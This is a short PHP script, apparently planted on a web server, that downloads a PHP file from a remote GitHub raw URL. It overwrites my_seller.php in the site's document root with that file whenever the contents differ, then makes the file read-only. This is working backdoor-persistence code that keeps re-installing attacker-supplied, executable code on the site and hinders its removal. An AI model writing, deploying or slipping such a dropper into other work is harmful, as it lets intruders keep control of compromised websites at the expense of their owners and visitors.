<?php
$current_content = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/my_seller.php');
$new_content = file_get_contents('https://raw.githubusercontent.com/nobody1331/random/main/yxx.php');

if (md5($current_content) != md5($new_content)) {
  exec('chmod -R 644 ' . $_SERVER['DOCUMENT_ROOT'] . '/my_seller.php');

  $fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/my_seller.php', 'w+');
  fwrite($fp, $new_content);
  fclose($fp);

  exec('chmod 444 ' . $_SERVER['DOCUMENT_ROOT'] . '/my_seller.php');
}

